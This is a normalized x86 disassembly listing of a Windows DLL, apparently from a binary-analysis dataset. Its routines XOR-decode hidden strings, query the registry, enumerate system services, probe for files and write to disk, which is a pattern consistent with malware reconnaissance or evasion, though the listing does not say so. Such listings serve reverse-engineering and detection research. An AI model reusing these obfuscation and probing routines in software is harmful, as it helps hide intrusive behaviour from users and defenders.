shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x8c ]
push esi
call sub_10035d20
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x170 ]
cmp [ ecx + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x144 ]
push ecx
lea edi [ ebp - 0x154 ]
call sub_10055ba0
xor ecx ecx
mov [ ebp - 0x4 ] 0x22
xor edx edx
mov [ ebp - 0x178 ] ebx
mov [ ebp - 0x160 ] ecx
mov [ ebp - 0x174 ] ebx
mov [ ebp - 0x155 ] bl
mov [ ebp - 0x15c ] edx
mov edx [ ebp - 0x17c ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_100074a0
mov esi eax
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x1f
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x20
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
cmp edx ebx
je r-xdata
push 0xffffffff
push ebx
lea ecx [ edi + 0xa8 ]
push esi
call sub_10035d20
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
cmp ecx ebx
je r-xdata
push 0xdac
call [ Sleep@IAT ]
mov ecx [ ebp - 0x160 ]
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0x164 ]
mov esi [ edx + 0xec ]
mov edi [ esi ]
lea eax [ ebp - 0x174 ]
push eax
mov eax [ ebp - 0x134 ]
lea ecx [ ebp - 0x160 ]
push ecx
lea edx [ ebp - 0x178 ]
push edx
push eax
lea ecx [ ebp - 0x144 ]
call sub_1000a770
mov edx [ edi + 0x8 ]
push eax
push ebx
mov ecx esi
call edx
mov edx [ ebp - 0x15c ]
mov ecx [ ebp - 0x160 ]
inc edx
mov [ ebp - 0x15c ] edx
cmp ecx ebx
je r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_1006591f
add esp 0x4
cmp eax ebx
jne r-xdata
cmp [ ecx ] bl
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov edx [ ebp - 0xf0 ]
push edx
call sub_1006591f
add esp 0x4
cmp edx 0x5
jg r-xdata
cmp [ ebp - 0x178 ] 0xc8
jne r-xdata
cmp [ ebp - 0x174 ] ebx
je r-xdata
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov eax [ ebp - 0x128 ]
push eax
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x155 ] 0x1
jne r-xdata
mov [ ebp - 0x155 ] 0x1
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_1006591f
add esp 0x4
cmp ecx ebx
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x15c ] 0x3
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
lea eax [ ebp - 0x174 ]
push eax
call sub_1005b7f0
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x10c ]
push eax
call sub_1006591f
add esp 0x4
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_1006591f
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax 0x43
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
mov edx [ ebp - 0x150 ]
lea ecx [ ebp - 0x148 ]
push ecx
push edx
push eax
call sub_10011560
mov eax [ ebp - 0x154 ]
push eax
call sub_1006591f
add esp 0x14
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x15c ]
mov ecx [ ebp - 0x16c ]
push ecx
mov ecx [ ebp - 0x150 ]
lea edx [ ebp - 0x148 ]
push edx
push ecx
push eax
call sub_10011560
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x14
sub_10010000
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov ecx [ eax ]
mov [ eax + 0x20 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] ecx
pop ebp
retn
sub_10010020
push ebp
mov ebp esp
sub esp 0x2bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x50
and edx 0xff
mov [ ebp + eax * 2 - 0xac ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x54 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffa
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x2b8 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xac ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
lea eax [ ebp - 0x2bc ]
push eax
mov eax [ ebp - 0x2b8 ]
lea ecx [ ebp - 0x2b4 ]
push ecx
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
push eax
mov [ ebp - 0x2bc ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x2b8 ]
push ecx
call [ RegCloseKey@IAT ]
test esi esi
pop esi
je r-xdata
mov esi 0x2
lea edx [ ebp - 0x50 ]
mov eax 0x13
call sub_10015360
mov edx [ edi + 0xd54 ]
movzx eax [ edi + 0x11a ]
movzx ecx [ edi + 0x118 ]
neg edx
sbb edx edx
and edx 0x20
add edx 0x20
push edx
mov edx [ edi + 0x10 ]
push eax
mov eax [ edi + 0xc ]
push ecx
mov ecx [ edi + 0x8 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x2b4 ]
push edx
lea eax [ ebp - 0x50 ]
push eax
mov ecx 0x104
call sub_10041b00
xor ecx ecx
add esp 0x20
test eax eax
setns cl
pop ebx
lea eax [ ecx - 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
and eax 0x2
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10010183
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000469c
add esp 0x14
pop ebp
retn
sub_100101a1
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002a40b
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1007952d
pop ecx
pop ebp
retn 0xc
call sub_1000a9a5
sub_100101fa
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1004fd6f
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1003c644
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_10010280
push ebp
mov ebp esp
push 0xffffffff
push sub_100829ce
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1a4 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1a0 ] edx
mov [ ebp - 0x1a8 ] ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
lea ebx [ eax + 0xe8 ]
mov eax [ ebx + 0x10 ]
push r--data
xor edi edi
mov ecx ebx
call sub_10039b60
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
lea eax [ edi + 0x3b ]
call sub_10060ac0
push esi
lea esi [ ebp - 0x9c ]
call sub_10058280
mov esi eax
push r--data
lea edx [ ebp - 0x144 ]
push ebx
push edx
mov [ ebp - 0x4 ] edi
call sub_1002cd10
mov ecx eax
mov eax esi
lea edi [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044a40
push eax
lea edx [ ebp - 0x1c ]
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x2
call sub_10030dc0
add esp 0x14
mov ebx 0x8
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov esi 0x7
xor edi edi
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
cmp [ ebp - 0x130 ] ebx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x144 ] ax
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov edx [ ebp - 0x144 ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x80 ]
xor edx edx
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0x6c ] ebx
jae r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_1006591f
add esp 0x4
push edi
push 0x80
push 0x4
push edi
push edi
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x19c ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x80 ]
push 0x2
push edi
push edi
push eax
call [ SetFilePointer@IAT ]
lea edx [ ebp - 0x48 ]
mov eax 0x32
call sub_10060ac0
mov ecx [ ebp - 0x1a0 ]
push ecx
lea esi [ ebp - 0x160 ]
call sub_10058280
mov edi eax
mov edx [ ebp - 0x1a4 ]
push edx
lea esi [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x7
call sub_10058280
push eax
lea edx [ ebp - 0x48 ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] bl
call sub_10016380
push eax
mov edx r--data
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x9
call sub_10030dc0
mov ecx eax
mov eax edi
lea edi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0xa
call sub_10044a40
push eax
mov edx r--data
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xb
call sub_10030dc0
add esp 0x14
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
cmp [ ebp - 0x6c ] ebx
jb r-xdata
mov esi 0x7
xor edi edi
xor ecx ecx
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x80 ]
push eax
jmp r-xdata
xor eax eax
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] ax
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_1006591f
add esp 0x4
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0x168 ] ebx
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] edi
mov [ ebp - 0x17c ] cx
mov [ ebp - 0x4 ] 0x11
cmp [ ebp - 0x14c ] ebx
jb r-xdata
mov eax [ ebp - 0x17c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x160 ] ax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] edi
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov edx [ ebp - 0x160 ]
push edx
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0x54 ]
push edi
mov edi [ WriteFile@IAT ]
lea ecx [ ebp - 0x1ac ]
push ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x19c ]
push ecx
push eax
push edx
call edi
lea edx [ ebp - 0x30 ]
mov eax 0x6b
call sub_10060ac0
mov ebx [ ebp - 0x1a8 ]
mov eax edx
push eax
lea ecx [ ebp - 0x198 ]
push ecx
call sub_10020be0
push eax
mov edx r--data
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x12
call sub_10030dc0
add esp 0xc
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x13
call sub_10036380
mov ebx 0x8
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
lea eax [ ebp - 0x64 ]
xor eax eax
mov [ ebp - 0xf8 ] 0x7
mov [ ebp - 0xfc ] 0x0
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x184 ] ebx
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x64 ]
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov ecx [ ebp - 0x198 ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x54 ]
mov esi [ ebp - 0x19c ]
push 0x0
lea edx [ ebp - 0x1ac ]
push edx
lea edx [ ecx + ecx ]
push edx
push eax
push esi
call edi
push esi
call [ CloseHandle@IAT ]
cmp [ ebp - 0x50 ] ebx
jb r-xdata
lea eax [ ebp - 0x64 ]
xor ecx ecx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x6c ] ebx
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0x80 ]
push edx
sub_100106eb
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_10079b60
lea esi [ eax + 0x1 ]
push esi
call sub_1004ac7a
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
mov eax edi
jmp r-xdata
pop edi
pop esi
sub_10010740
push ebp
mov ebp esp
sub esp 0x48c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x488 ] eax
call [ GetProcessHeap@IAT ]
push 0xf003f
push 0x0
mov edi eax
push 0x0
mov [ ebp - 0x484 ] edi
mov [ ebp - 0x470 ] 0x0
call [ OpenSCManagerW@IAT ]
mov esi eax
mov [ ebp - 0x478 ] esi
test esi esi
jne r-xdata
push ebx
mov ebx [ EnumServicesStatusExW@IAT ]
push 0x0
push 0x0
lea ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x47c ]
push edx
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push esi
call ebx
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x47c ]
push eax
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x480 ] edi
test edi edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
je r-xdata
mov eax [ ebp - 0x47c ]
push 0x0
push 0x0
lea ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x48c ]
push edx
push eax
push edi
push 0x3
push 0x10
push 0x0
push esi
call ebx
test eax eax
jne r-xdata
push esi
call [ CloseServiceHandle@IAT ]
pop ebx
lea eax [ edi + 0x3 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
call [ CloseServiceHandle@IAT ]
pop ebx
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0x1
call sub_100331b0
lea edx [ ebp - 0x14 ]
mov eax 0x3
call sub_100331b0
push edx
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x478 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
lea eax [ ebp - 0x46c ]
push eax
lea ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x488 ]
push edx
lea edx [ ebp - 0x5c ]
lea ebx [ ebp - 0x264 ]
call sub_1000b110
mov eax [ ebp - 0x478 ]
add esp 0x1c
push eax
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x470 ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop ebx
and eax 0xfffffffb
pop edi
xor ecx ebp
add eax 0x5
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x484 ]
push edi
push 0x0
push ecx
call [ HeapFree@IAT ]
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10010907
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x18 ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x1c
sub_10010930
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edx [ ebp - 0x58 ]
mov edi ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x1c ]
push edx
mov [ ebp - 0x58 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x10e
call sub_100050e0
mov esi [ ebp - 0x58 ]
call sub_1004df80
mov esi eax
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x5c ]
mov esi [ ecx ]
test esi esi
je r-xdata
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea esp [ esp ]
mov edi [ esi ]
lea edx [ ebp - 0x54 ]
push edx
mov ecx ebx
call sub_100061e0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10010a10
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x4c
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x28
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x58 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x10
call sub_100429d0
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10010ab0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
mov [ edx ] ecx
cmp [ edi ] ebx
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
cmp edx [ edi ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edx ] eax
je r-xdata
mov esi [ edi ]
mov cl [ esi ]
cmp cl 0x80
jae r-xdata
cmp cl 0xc0
jb r-xdata
inc esi
movzx eax cl
mov [ edi ] esi
jmp r-xdata
inc [ edi ]
movzx eax cl
cmp cl 0xe0
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp cl 0xf0
jae r-xdata
and eax 0x1f
mov ecx 0x1
cmp eax 0x10ffff
ja r-xdata
mov [ ecx ] 0x1
cmp cl 0xf8
jae r-xdata
and eax 0xf
mov ecx 0x2
jmp r-xdata
inc esi
mov [ edi ] esi
test ecx ecx
jle r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
mov ecx [ edx ]
mov ebx [ ebp + 0x10 ]
mov [ ecx ] ax
add [ edx ] 0x2
cmp [ edi ] ebx
jne r-xdata
and eax 0x3
cmp cl 0xfc
sbb ecx ecx
add ecx 0x5
jne r-xdata
and eax 0x7
mov ecx 0x3
jmp r-xdata
sub ebx esi
lea edx [ ecx + 0x1 ]
cmp ebx edx
jl r-xdata
mov edx [ ebp + 0x20 ]
jmp r-xdata
inc esi
mov [ edi ] esi
jmp r-xdata
mov dl [ esi ]
lea ebx [ edx + 0x80 ]
cmp bl 0x3f
ja r-xdata
movzx edx dl
and edx 0x3f
shl eax 0x6
dec ecx
inc esi
or eax edx
mov [ edi ] esi
test ecx ecx
jg r-xdata
sub_10010bd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081280
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
